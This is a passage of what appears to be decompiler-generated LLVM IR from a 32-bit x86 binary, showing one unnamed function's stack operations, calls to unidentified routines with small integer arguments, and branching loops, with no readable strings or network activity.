  %v2_804dec8 = call i32 @function_8051300(i8 0)
  store i32 %v2_804dec8, i32* %eax.global-to-local, align 4
  %v0_804decd = load i32, i32* @esp, align 4
  %v1_804decd = inttoptr i32 %v0_804decd to i32*
  store i32 7, i32* %v1_804decd, align 4
  %v2_804ded4 = call i32 @function_8051300(i8 0)
  store i32 %v2_804ded4, i32* %eax.global-to-local, align 4
  %v0_804ded9 = load i32, i32* @esp, align 4
  %v1_804ded9 = inttoptr i32 %v0_804ded9 to i32*
  %v3_804ded9 = add i32 %v0_804ded9, 4
  %v1_804deda = inttoptr i32 %v3_804ded9 to i32*
  %v2_804deda = load i32, i32* %v1_804deda, align 4
  store i32 %v2_804deda, i32* @ebx, align 4
  store i32 0, i32* %v1_804deda, align 4
  store i32 6, i32* %v1_804ded9, align 4
  %v3_804dedf = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804dedf, i32* %eax.global-to-local, align 4
  %v0_804dee4 = load i32, i32* @esp, align 4
  %v1_804dee4 = inttoptr i32 %v0_804dee4 to i32*
  %v3_804dee4 = add i32 %v0_804dee4, 4
  %v1_804dee5 = inttoptr i32 %v3_804dee4 to i32*
  store i32 %v3_804dedf, i32* %v1_804dee5, align 4
  %v1_804dee7 = add i32 %v0_804dee4, 8328
  store i32 %v1_804dee7, i32* %eax.global-to-local, align 4
  store i32 %v1_804dee7, i32* %v1_804dee4, align 4
  %v3_804deef = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804deef, i32* %eax.global-to-local, align 4
  %v0_804def4 = load i32, i32* @esp, align 4
  %v1_804def4 = add i32 %v0_804def4, 8328
  %v1_804defb = inttoptr i32 %v0_804def4 to i32*
  %v3_804defb = add i32 %v0_804def4, 4
  %v2_804defc = add i32 %v1_804def4, %v3_804deef
  store i32 %v2_804defc, i32* @esi, align 4
  %v1_804defe = inttoptr i32 %v3_804defb to i32*
  %v2_804defe = load i32, i32* %v1_804defe, align 4
  store i32 %v2_804defe, i32* @ebx, align 4
  %v0_804deff = load i32, i32* @edi, align 4
  store i32 %v0_804deff, i32* %v1_804defe, align 4
  %v0_804df00 = load i32, i32* @esi, align 4
  store i32 %v0_804df00, i32* %v1_804defb, align 4
  %v3_804df01 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df01, i32* %eax.global-to-local, align 4
  store i32 %v3_804df01, i32* @ebx, align 4
  %v0_804df08 = load i32, i32* @esp, align 4
  %v1_804df08 = inttoptr i32 %v0_804df08 to i32*
  %v2_804df08 = load i32, i32* %v1_804df08, align 4
  store i32 %v2_804df08, i32* %eax.global-to-local, align 4
  %v3_804df08 = add i32 %v0_804df08, 4
  %v1_804df09 = inttoptr i32 %v3_804df08 to i32*
  store i32 0, i32* %v1_804df09, align 4
  store i32 7, i32* %v1_804df08, align 4
  %v3_804df0e = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804df0e, i32* %eax.global-to-local, align 4
  %v0_804df13 = load i32, i32* @esp, align 4
  %v1_804df13 = inttoptr i32 %v0_804df13 to i32*
  %v3_804df13 = add i32 %v0_804df13, 4
  %v1_804df14 = inttoptr i32 %v3_804df13 to i32*
  store i32 %v3_804df0e, i32* %v1_804df14, align 4
  %v0_804df16 = load i32, i32* @esi, align 4
  %v1_804df16 = load i32, i32* @ebx, align 4
  %v2_804df16 = add i32 %v1_804df16, %v0_804df16
  store i32 %v2_804df16, i32* %eax.global-to-local, align 4
  store i32 %v2_804df16, i32* %v1_804df13, align 4
  %v3_804df1a = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df1a, i32* %eax.global-to-local, align 4
  %v0_804df1f = load i32, i32* @esp, align 4
  %v1_804df1f = inttoptr i32 %v0_804df1f to i32*
  %v3_804df1f = add i32 %v0_804df1f, 4
  %v1_804df20 = inttoptr i32 %v3_804df1f to i32*
  %v2_804df20 = load i32, i32* %v1_804df20, align 4
  store i32 %v2_804df20, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804df20, align 4
  store i32 6, i32* %v1_804df1f, align 4
  %v3_804df25 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804df25, i32* %eax.global-to-local, align 4
  %v0_804df2a = load i32, i32* @esp, align 4
  %v1_804df2a = inttoptr i32 %v0_804df2a to i32*
  %v3_804df2a = add i32 %v0_804df2a, 4
  %v1_804df2b = inttoptr i32 %v3_804df2a to i32*
  %v2_804df2b = load i32, i32* %v1_804df2b, align 4
  store i32 %v2_804df2b, i32* @ebx, align 4
  store i32 %v3_804df25, i32* %v1_804df2b, align 4
  %v1_804df2d = add i32 %v0_804df2a, 8264
  store i32 %v1_804df2d, i32* %eax.global-to-local, align 4
  store i32 %v1_804df2d, i32* %v1_804df2a, align 4
  %v3_804df35 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df35, i32* %eax.global-to-local, align 4
  %v0_804df3a = load i32, i32* @esp, align 4
  %v1_804df3a = add i32 %v3_804df35, 8264
  %v2_804df41 = add i32 %v1_804df3a, %v0_804df3a
  store i32 %v2_804df41, i32* @esi, align 4
  %v1_804df43 = inttoptr i32 %v0_804df3a to i32*
  %v2_804df43 = load i32, i32* %v1_804df43, align 4
  store i32 %v2_804df43, i32* %eax.global-to-local, align 4
  %v3_804df43 = add i32 %v0_804df3a, 4
  %v1_804df44 = inttoptr i32 %v3_804df43 to i32*
  %v0_804df45 = load i32, i32* @edi, align 4
  store i32 %v0_804df45, i32* %v1_804df44, align 4
  %v0_804df46 = load i32, i32* @esi, align 4
  store i32 %v0_804df46, i32* %v1_804df43, align 4
  %v3_804df47 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df47, i32* %eax.global-to-local, align 4
  %v0_804df4c = load i32, i32* @esp, align 4
  %v1_804df4c = inttoptr i32 %v0_804df4c to i32*
  %v3_804df4c = add i32 %v0_804df4c, 4
  %v1_804df4d = inttoptr i32 %v3_804df4c to i32*
  store i32 %v3_804df47, i32* @ebx, align 4
  store i32 0, i32* %v1_804df4d, align 4
  store i32 11, i32* %v1_804df4c, align 4
  %v3_804df54 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804df54, i32* %eax.global-to-local, align 4
  %v0_804df59 = load i32, i32* @esp, align 4
  %v1_804df59 = inttoptr i32 %v0_804df59 to i32*
  %v3_804df59 = add i32 %v0_804df59, 4
  %v1_804df5a = inttoptr i32 %v3_804df59 to i32*
  store i32 %v3_804df54, i32* %v1_804df5a, align 4
  %v0_804df5c = load i32, i32* @esi, align 4
  %v1_804df5c = load i32, i32* @ebx, align 4
  %v2_804df5c = add i32 %v1_804df5c, %v0_804df5c
  store i32 %v2_804df5c, i32* %eax.global-to-local, align 4
  store i32 %v2_804df5c, i32* %v1_804df59, align 4
  %v3_804df60 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804df60, i32* %eax.global-to-local, align 4
  %v0_804df65 = load i32, i32* @esp, align 4
  %v1_804df65 = inttoptr i32 %v0_804df65 to i32*
  store i32 6, i32* %v1_804df65, align 4
  %v2_804df6c = call i32 @function_8051280(i8 0)
  store i32 %v2_804df6c, i32* %eax.global-to-local, align 4
  %v0_804df71 = load i32, i32* @esp, align 4
  %v1_804df71 = inttoptr i32 %v0_804df71 to i32*
  store i32 7, i32* %v1_804df71, align 4
  %v2_804df78 = call i32 @function_8051280(i8 0)
  %v0_804df7d = load i32, i32* @esp, align 4
  %v1_804df80 = add i32 %v0_804df7d, 8
  %v2_804df80 = inttoptr i32 %v1_804df80 to i32*
  store i32 4095, i32* %v2_804df80, align 4
  %v1_804df85 = add i32 %v0_804df7d, 4168
  store i32 %v1_804df85, i32* @edi, align 4
  %v2_804df8c = add i32 %v0_804df7d, 4
  %v3_804df8c = inttoptr i32 %v2_804df8c to i32*
  store i32 %v1_804df85, i32* %v3_804df8c, align 4
  %v1_804df8d = add i32 %v0_804df7d, 8328
  store i32 %v1_804df8d, i32* %eax.global-to-local, align 4
  %v3_804df94 = inttoptr i32 %v0_804df7d to i32*
  store i32 %v1_804df8d, i32* %v3_804df94, align 4
  %v4_804df95 = call i32 @function_80523c2(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804df95, i32* %eax.global-to-local, align 4
  %v0_804df9a = load i32, i32* @esp, align 4
  %v1_804df9a = add i32 %v0_804df9a, 16
  store i32 %v4_804df95, i32* @ebx, align 4
  %v10_804df9f = icmp eq i32 %v4_804df95, -1
  br i1 %v10_804df9f, label %dec_label_pc_804e0c7, label %dec_label_pc_804dfa8

dec_label_pc_804dfa8:                             ; preds = %dec_label_pc_804deb3
  %v2_804dfa8 = add i32 %v4_804df95, 4152
  %v3_804dfa8 = add i32 %v2_804dfa8, %v1_804df9a
  %v4_804dfa8 = inttoptr i32 %v3_804dfa8 to i8*
  store i8 0, i8* %v4_804dfa8, align 1
  %v0_804dfb0 = load i32, i32* @esp, align 4
  %v1_804dfb3 = add i32 %v0_804dfb0, -16
  %v2_804dfb3 = inttoptr i32 %v1_804dfb3 to i32*
  store i32 10, i32* %v2_804dfb3, align 4
  %v2_804dfb5 = call i32 @function_8051300(i8 0)
  store i32 %v2_804dfb5, i32* %eax.global-to-local, align 4
  %v0_804dfba = load i32, i32* @esp, align 4
  %v1_804dfba = inttoptr i32 %v0_804dfba to i32*
  %v3_804dfba = add i32 %v0_804dfba, 4
  %v1_804dfbb = inttoptr i32 %v3_804dfba to i32*
  %v2_804dfbb = load i32, i32* %v1_804dfbb, align 4
  store i32 %v2_804dfbb, i32* @esi, align 4
  store i32 0, i32* %v1_804dfbb, align 4
  store i32 10, i32* %v1_804dfba, align 4
  %v3_804dfc0 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  %v0_804dfc5 = load i32, i32* @esp, align 4
  %v2_804dfc8 = add i32 %v0_804dfc5, 8
  %v3_804dfc8 = inttoptr i32 %v2_804dfc8 to i32*
  store i32 %v3_804dfc0, i32* %v3_804dfc8, align 4
  %v0_804dfc9 = load i32, i32* @ebx, align 4
  %v1_804dfc9 = add i32 %v0_804dfc9, -1
  store i32 %v1_804dfc9, i32* %eax.global-to-local, align 4
  %v2_804dfcc = add i32 %v0_804dfc5, 4
  %v3_804dfcc = inttoptr i32 %v2_804dfcc to i32*
  store i32 %v1_804dfc9, i32* %v3_804dfcc, align 4
  %v1_804dfcd = add i32 %v0_804dfc5, 4168
  store i32 %v1_804dfcd, i32* @edi, align 4
  %v3_804dfd4 = inttoptr i32 %v0_804dfc5 to i32*
  store i32 %v1_804dfcd, i32* %v3_804dfd4, align 4
  %v4_804dfd5 = call i32 @function_8051f40(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804dfda = load i32, i32* @esp, align 4
  %v1_804dfdd = add i32 %v4_804dfd5, 1
  %v8_804dfdd = icmp eq i32 %v1_804dfdd, 0
  store i32 %v1_804dfdd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dfdd, label %dec_label_pc_804dffd, label %dec_label_pc_804dfe0

dec_label_pc_804dfe0:                             ; preds = %dec_label_pc_804dfa8
  %v1_804dfe3 = add i32 %v0_804dfda, 4168
  store i32 %v1_804dfe3, i32* %eax.global-to-local, align 4
  %v3_804dfea = inttoptr i32 %v0_804dfda to i32*
  store i32 %v1_804dfe3, i32* %v3_804dfea, align 4
  %v0_804dfeb = call i32 @function_80524e0()
  store i32 %v0_804dfeb, i32* %eax.global-to-local, align 4
  %v0_804dff0 = load i32, i32* @esp, align 4
  %v1_804dff0 = inttoptr i32 %v0_804dff0 to i32*
  %v2_804dff0 = load i32, i32* %v1_804dff0, align 4
  store i32 %v2_804dff0, i32* %eax.global-to-local, align 4
  %v3_804dff0 = add i32 %v0_804dff0, 4
  %v1_804dff1 = inttoptr i32 %v3_804dff0 to i32*
  store i32 9, i32* %v1_804dff1, align 4
  %v0_804dff4 = load i32, i32* @ebp, align 4
  store i32 %v0_804dff4, i32* %v1_804dff0, align 4
  %v4_804dff5 = call i32 @function_80522d0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dff5, i32* %eax.global-to-local, align 4
  %v0_804dffa = load i32, i32* @esp, align 4
  br label %dec_label_pc_804dffd

dec_label_pc_804dffd:                             ; preds = %dec_label_pc_804dfa8, %dec_label_pc_804dfe0
  %v0_804dffd.in = phi i32 [ %v0_804dfda, %dec_label_pc_804dfa8 ], [ %v0_804dffa, %dec_label_pc_804dfe0 ]
  %v2_804e000 = inttoptr i32 %v0_804dffd.in to i32*
  store i32 10, i32* %v2_804e000, align 4
  %v2_804e002 = call i32 @function_8051280(i8 0)
  store i32 %v2_804e002, i32* %eax.global-to-local, align 4
  %v0_804e007 = call i32 @function_8052245()
  store i32 %v0_804e007, i32* %eax.global-to-local, align 4
  %v0_804e00c = load i32, i32* @esp, align 4
  %v1_804e00c = add i32 %v0_804e00c, 16
  %v0_804e00f = load i32, i32* @ebp, align 4
  %v12_804e00f = icmp eq i32 %v0_804e00f, %v0_804e007
  br i1 %v12_804e00f, label %dec_label_pc_804e038, label %dec_label_pc_804e013

dec_label_pc_804e013:                             ; preds = %dec_label_pc_804dffd
  %v0_804e013 = call i32 @function_805226b()
  store i32 %v0_804e013, i32* %eax.global-to-local, align 4
  %v0_804e018 = load i32, i32* @ebp, align 4
  %v12_804e018 = icmp eq i32 %v0_804e018, %v0_804e013
  %v0_804e03a.pre = load i32, i32* @esp, align 4
  br i1 %v12_804e018, label %dec_label_pc_804e038, label %dec_label_pc_804e01c

dec_label_pc_804e01c:                             ; preds = %dec_label_pc_804e013
  %v2_804e01c = add i32 %v0_804e03a.pre, -4
  %v3_804e01c = inttoptr i32 %v2_804e01c to i32*
  store i32 %v0_804e013, i32* %v3_804e01c, align 4
  %v2_804e01d = add i32 %v0_804e03a.pre, -8
  %v3_804e01d = inttoptr i32 %v2_804e01d to i32*
  store i32 %v0_804e013, i32* %v3_804e01d, align 4
  %v0_804e01e = load i32, i32* @global_var_8056960.22, align 32
  store i32 %v0_804e01e, i32* %eax.global-to-local, align 4
  %v2_804e023 = add i32 %v0_804e03a.pre, -12
  %v3_804e023 = inttoptr i32 %v2_804e023 to i32*
  store i32 %v0_804e01e, i32* %v3_804e023, align 4
  %v1_804e024 = add i32 %v0_804e03a.pre, 4152
  store i32 %v1_804e024, i32* @edi, align 4
  %v2_804e02b = add i32 %v0_804e03a.pre, -16
  %v3_804e02b = inttoptr i32 %v2_804e02b to i32*
  store i32 %v1_804e024, i32* %v3_804e02b, align 4
  %v0_804e02c = call i32 @function_8051fc0()
  store i32 %v0_804e02c, i32* %eax.global-to-local, align 4
  %v0_804e031 = load i32, i32* @esp, align 4
  %v3_804e034 = trunc i32 %v0_804e02c to i8
  %v4_804e034 = icmp eq i8 %v3_804e034, 0
  br i1 %v4_804e034, label %dec_label_pc_804e093, label %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge

dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge: ; preds = %dec_label_pc_804e01c
  %v1_804e031 = add i32 %v0_804e031, 16
  %v0_804e038.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804e038

dec_label_pc_804e038:                             ; preds = %dec_label_pc_804e013, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge, %dec_label_pc_804dffd
  %v0_804e03a = phi i32 [ %v1_804e031, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge ], [ %v1_804e00c, %dec_label_pc_804dffd ], [ %v0_804e03a.pre, %dec_label_pc_804e013 ]
  %v0_804e038 = phi i32 [ %v0_804e038.pre, %dec_label_pc_804e01c.dec_label_pc_804e038_crit_edge ], [ %v0_804e007, %dec_label_pc_804dffd ], [ %v0_804e013, %dec_label_pc_804e013 ]
  store i32 %v0_804e038, i32* @esi, align 4
  %v1_804e03a = add i32 %v0_804e03a, 8
  %v2_804e03a = inttoptr i32 %v1_804e03a to i32*
  %v3_804e03a = load i32, i32* %v2_804e03a, align 4
  store i32 %v3_804e03a, i32* @ebx, align 4
  br label %dec_label_pc_804de50

dec_label_pc_804e043:                             ; preds = %dec_label_pc_804de50
  %v1_804e046 = add i32 %v0_804de5d, 32
  %v2_804e046 = inttoptr i32 %v1_804e046 to i32*
  %v3_804e046 = load i32, i32* %v2_804e046, align 4
  store i32 %v3_804e046, i32* @eax, align 4
  %v3_804e04a = inttoptr i32 %v0_804de5d to i32*
  store i32 %v3_804e046, i32* %v3_804e04a, align 4
  %v0_804e04b = call i32 @function_8052544()
  store i32 %v0_804e04b, i32* %eax.global-to-local, align 4
  %v0_804e050 = load i32, i32* @esp, align 4
  %v1_804e050 = add i32 %v0_804e050, 16
  br label %dec_label_pc_804de10

dec_label_pc_804e058:                             ; preds = %dec_label_pc_804de92
  %v0_804e058 = load i32, i32* @ebp, align 4
  %v7_804e05e = icmp sgt i32 %v0_804e058, 400
  br i1 %v7_804e05e, label %dec_label_pc_804e064, label %dec_label_pc_804de50

dec_label_pc_804e064:                             ; preds = %dec_label_pc_804e058
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804e069 = add i32 %v0_804de9e, 28
  %v2_804e069 = inttoptr i32 %v1_804e069 to i32*
  %v3_804e069 = load i32, i32* %v2_804e069, align 4
  %v10_804e069 = udiv i32 %v3_804e069, 2
  store i32 %v10_804e069, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804e077 = load i32, i32* %v2_804e069, align 4
  %v15_804e077 = icmp eq i32 %v3_804e077, 0
  %v1_804e07b = icmp eq i1 %v15_804e077, false
  br i1 %v1_804e07b, label %dec_label_pc_804de50, label %dec_label_pc_804e081

dec_label_pc_804e081:                             ; preds = %dec_label_pc_804e064
  %v2_804e084 = inttoptr i32 %v0_804de9e to i32*
  store i32 1, i32* %v2_804e084, align 4
  %v1_804e086 = call i32 @function_8053da0(i32 0)
  store i32 %v1_804e086, i32* %eax.global-to-local, align 4
  %v0_804e08b = load i32, i32* @esp, align 4
  %v1_804e08b = add i32 %v0_804e08b, 16
  br label %dec_label_pc_804de50

dec_label_pc_804e093:                             ; preds = %dec_label_pc_804e01c
  %v2_804e093 = add i32 %v0_804e031, 12
  %v3_804e093 = inttoptr i32 %v2_804e093 to i32*
  store i32 %v0_804e02c, i32* %v3_804e093, align 4
  %v2_804e094 = add i32 %v0_804e031, 8
  %v3_804e094 = inttoptr i32 %v2_804e094 to i32*
  store i32 %v0_804e02c, i32* %v3_804e094, align 4
  %v1_804e095 = add i32 %v0_804e031, 4
  %v2_804e095 = inttoptr i32 %v1_804e095 to i32*
  store i32 0, i32* %v2_804e095, align 4
  %v1_804e097 = add i32 %v0_804e031, 4168
  store i32 %v1_804e097, i32* %eax.global-to-local, align 4
  %v3_804e09e = inttoptr i32 %v0_804e031 to i32*
  store i32 %v1_804e097, i32* %v3_804e09e, align 4
  %v3_804e09f = call i32 @function_8052302(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804e09f, i32* %eax.global-to-local, align 4
  %v0_804e0a4 = load i32, i32* @esp, align 4
  store i32 %v3_804e09f, i32* @ebx, align 4
  %v10_804e0a9 = icmp eq i32 %v3_804e09f, -1
  %v1_804e0ac = icmp eq i1 %v10_804e0a9, false
  br i1 %v1_804e0ac, label %dec_label_pc_804e0bb, label %dec_label_pc_804e0ae

dec_label_pc_804e0ae:                             ; preds = %dec_label_pc_804e093
  %v0_804e0ae = load i32, i32* @edi, align 4
  %v2_804e0ae = add i32 %v0_804e0a4, 12
  %v3_804e0ae = inttoptr i32 %v2_804e0ae to i32*
  store i32 %v0_804e0ae, i32* %v3_804e0ae, align 4
  %v0_804e0af = load i32, i32* @edi, align 4
  %v2_804e0af = add i32 %v0_804e0a4, 8
  %v3_804e0af = inttoptr i32 %v2_804e0af to i32*
  store i32 %v0_804e0af, i32* %v3_804e0af, align 4
  %v1_804e0b0 = add i32 %v0_804e0a4, 4
  %v2_804e0b0 = inttoptr i32 %v1_804e0b0 to i32*
  store i32 9, i32* %v2_804e0b0, align 4
  %v0_804e0b2 = load i32, i32* @ebp, align 4
  %v3_804e0b2 = inttoptr i32 %v0_804e0a4 to i32*
  store i32 %v0_804e0b2, i32* %v3_804e0b2, align 4
  %v4_804e0b3 = call i32 @function_80522d0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e0b3, i32* %eax.global-to-local, align 4
  %v0_804e0b8 = load i32, i32* @esp, align 4
  %v0_804e0be.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e0bb

dec_label_pc_804e0bb:                             ; preds = %dec_label_pc_804e093, %dec_label_pc_804e0ae
  %v0_804e0be = phi i32 [ %v3_804e09f, %dec_label_pc_804e093 ], [ %v0_804e0be.pre, %dec_label_pc_804e0ae ]
  %v0_804e0bb.in = phi i32 [ %v0_804e0a4, %dec_label_pc_804e093 ], [ %v0_804e0b8, %dec_label_pc_804e0ae ]
  %v3_804e0be = inttoptr i32 %v0_804e0bb.in to i32*
  store i32 %v0_804e0be, i32* %v3_804e0be, align 4
  %v1_804e0bf = call i32 @function_80521f1(i32 0)
  store i32 %v1_804e0bf, i32* %eax.global-to-local, align 4
  %v0_804e0c4 = load i32, i32* @esp, align 4
  %v1_804e0c4 = add i32 %v0_804e0c4, 16
  br label %dec_label_pc_804e0c7

dec_label_pc_804e0c7:                             ; preds = %dec_label_pc_804deb3, %dec_label_pc_804e0bb
  %v1_804e0c7 = phi i32 [ %v1_804df9a, %dec_label_pc_804deb3 ], [ %v1_804e0c4, %dec_label_pc_804e0bb ]
  %v0_804e0c7 = load i32, i32* @esi, align 4
  %v2_804e0c7 = add i32 %v1_804e0c7, -4
  %v3_804e0c7 = inttoptr i32 %v2_804e0c7 to i32*
  store i32 %v0_804e0c7, i32* %v3_804e0c7, align 4
  %v0_804e0c8 = load i32, i32* @esi, align 4
  %v2_804e0c8 = add i32 %v1_804e0c7, -8
  %v3_804e0c8 = inttoptr i32 %v2_804e0c8 to i32*
  store i32 %v0_804e0c8, i32* %v3_804e0c8, align 4
  %v1_804e0c9 = add i32 %v1_804e0c7, -12
  %v2_804e0c9 = inttoptr i32 %v1_804e0c9 to i32*
  store i32 0, i32* %v2_804e0c9, align 4
  %v1_804e0cb = add i32 %v1_804e0c7, 8312
  %v2_804e0d2 = add i32 %v1_804e0c7, -16
  %v3_804e0d2 = inttoptr i32 %v2_804e0d2 to i32*
  store i32 %v1_804e0cb, i32* %v3_804e0d2, align 4
  %v3_804e0d3 = call i32 @function_8052302(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v1_804e0d8 = load i32, i32* @esp, align 4
  %v2_804e0d8 = add i32 %v1_804e0d8, 56
  %v3_804e0d8 = inttoptr i32 %v2_804e0d8 to i32*
  store i32 %v3_804e0d3, i32* %v3_804e0d8, align 4
  %v0_804e0dc = load i32, i32* @esp, align 4
  %v1_804e0df = add i32 %v3_804e0d3, 1
  %v8_804e0df = icmp eq i32 %v1_804e0df, 0
  store i32 %v1_804e0df, i32* @eax, align 4
  br i1 %v8_804e0df, label %dec_label_pc_804e31c, label %dec_label_pc_804e0e6

dec_label_pc_804e0e6:                             ; preds = %dec_label_pc_804e0c7
  %v2_804e0e9 = inttoptr i32 %v0_804e0dc to i32*
  store i32 12, i32* %v2_804e0e9, align 4
  %v2_804e0eb = call i32 @function_8051300(i8 0)
  store i32 %v2_804e0eb, i32* %eax.global-to-local, align 4
  %v0_804e0f0 = load i32, i32* @esp, align 4
  %v1_804e0f0 = inttoptr i32 %v0_804e0f0 to i32*
  store i32 13, i32* %v1_804e0f0, align 4
  %v2_804e0f7 = call i32 @function_8051300(i8 0)
  store i32 %v2_804e0f7, i32* %eax.global-to-local, align 4
  %v0_804e0fc = load i32, i32* @esp, align 4
  %v1_804e0fc = inttoptr i32 %v0_804e0fc to i32*
  store i32 14, i32* %v1_804e0fc, align 4
  %v2_804e103 = call i32 @function_8051300(i8 0)
  store i32 %v2_804e103, i32* %eax.global-to-local, align 4
  %v0_804e108 = load i32, i32* @esp, align 4
  %v1_804e108 = inttoptr i32 %v0_804e108 to i32*
  store i32 15, i32* %v1_804e108, align 4
  %v2_804e10f = call i32 @function_8051300(i8 0)
  store i32 %v2_804e10f, i32* %eax.global-to-local, align 4
  %v0_804e114 = load i32, i32* @esp, align 4
  %v1_804e114 = inttoptr i32 %v0_804e114 to i32*
  store i32 16, i32* %v1_804e114, align 4
  %v2_804e11b = call i32 @function_8051300(i8 0)
  store i32 %v2_804e11b, i32* %eax.global-to-local, align 4
  %v0_804e120 = load i32, i32* @esp, align 4
  %v1_804e120 = inttoptr i32 %v0_804e120 to i32*
  %v3_804e120 = add i32 %v0_804e120, 4
  %v1_804e121 = inttoptr i32 %v3_804e120 to i32*
  %v1_804e122 = add i32 %v0_804e120, 8436
  store i32 %v1_804e122, i32* %eax.global-to-local, align 4
  store i32 %v1_804e122, i32* %v1_804e121, align 4
  store i32 12, i32* %v1_804e120, align 4
  %v3_804e12c = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804e12c, i32* %eax.global-to-local, align 4
  %v1_804e131 = load i32, i32* @esp, align 4
  %v2_804e131 = add i32 %v1_804e131, 52
  %v3_804e131 = inttoptr i32 %v2_804e131 to i32*
  store i32 %v3_804e12c, i32* %v3_804e131, align 4
  %v0_804e135 = load i32, i32* @esp, align 4
  %v1_804e135 = inttoptr i32 %v0_804e135 to i32*
  %v3_804e135 = add i32 %v0_804e135, 4
  %v1_804e136 = inttoptr i32 %v3_804e135 to i32*
  %v1_804e137 = add i32 %v0_804e135, 8432
  store i32 %v1_804e137, i32* %eax.global-to-local, align 4
  store i32 %v1_804e137, i32* %v1_804e136, align 4
  store i32 13, i32* %v1_804e135, align 4
  %v3_804e141 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804e141, i32* %eax.global-to-local, align 4
  %v1_804e146 = load i32, i32* @esp, align 4
  %v2_804e146 = add i32 %v1_804e146, 48
  %v3_804e146 = inttoptr i32 %v2_804e146 to i32*
  store i32 %v3_804e141, i32* %v3_804e146, align 4
  %v0_804e14a = load i32, i32* @esp, align 4
  %v1_804e14a = inttoptr i32 %v0_804e14a to i32*
  %v3_804e14a = add i32 %v0_804e14a, 4
  %v1_804e14b = inttoptr i32 %v3_804e14a to i32*
  %v2_804e14b = load i32, i32* %v1_804e14b, align 4
  store i32 %v2_804e14b, i32* @edi, align 4
  %v1_804e14c = add i32 %v0_804e14a, 8428
  store i32 %v1_804e14c, i32* %eax.global-to-local, align 4
  store i32 %v1_804e14c, i32* %v1_804e14b, align 4
  store i32 14, i32* %v1_804e14a, align 4
  %v3_804e156 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804e156, i32* %eax.global-to-local, align 4
  %v1_804e15b = load i32, i32* @esp, align 4
  %v2_804e15b = add i32 %v1_804e15b, 44
  %v3_804e15b = inttoptr i32 %v2_804e15b to i32*
  store i32 %v3_804e156, i32* %v3_804e15b, align 4
  %v0_804e15f = load i32, i32* @esp, align 4
  %v1_804e15f = inttoptr i32 %v0_804e15f to i32*
  %v3_804e15f = add i32 %v0_804e15f, 4
  %v1_804e160 = inttoptr i32 %v3_804e15f to i32*
  %v2_804e160 = load i32, i32* %v1_804e160, align 4
  store i32 %v2_804e160, i32* @ebx, align 4
  %v1_804e161 = add i32 %v0_804e15f, 8440
  store i32 %v1_804e161, i32* %eax.global-to-local, align 4
  store i32 %v1_804e161, i32* %v1_804e160, align 4
  store i32 15, i32* %v1_804e15f, align 4
  %v3_804e16b = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804e16b, i32* %eax.global-to-local, align 4
  %v1_804e170 = load i32, i32* @esp, align 4
  %v2_804e170 = add i32 %v1_804e170, 40
  %v3_804e170 = inttoptr i32 %v2_804e170 to i32*
  store i32 %v3_804e16b, i32* %v3_804e170, align 4
  %v0_804e174 = load i32, i32* @esp, align 4
  %v1_804e174 = inttoptr i32 %v0_804e174 to i32*
  %v3_804e174 = add i32 %v0_804e174, 4
  %v1_804e175 = inttoptr i32 %v3_804e174 to i32*
  %v1_804e176 = add i32 %v0_804e174, 8424
  store i32 %v1_804e176, i32* %eax.global-to-local, align 4
  store i32 %v1_804e176, i32* %v1_804e175, align 4
  store i32 16, i32* %v1_804e174, align 4
  %v3_804e180 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804e180, i32* %eax.global-to-local, align 4
  %v1_804e185 = load i32, i32* @esp, align 4
  %v2_804e185 = add i32 %v1_804e185, 36
  %v3_804e185 = inttoptr i32 %v2_804e185 to i32*
  store i32 %v3_804e180, i32* %v3_804e185, align 4
  %v0_804e189 = load i32, i32* @esp, align 4
  %v1_804e189 = add i32 %v0_804e189, 16
  %v0_804e18c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e288, %dec_label_pc_804e2a0.backedge, %dec_label_pc_804e297, %dec_label_pc_804e0e6
  %v1_804e18c = phi i32 [ %v1_804e189, %dec_label_pc_804e0e6 ], [ %v0_804e297, %dec_label_pc_804e297 ], [ %v0_804e297, %dec_label_pc_804e2a0.backedge ], [ %v0_804e297, %dec_label_pc_804e288 ]
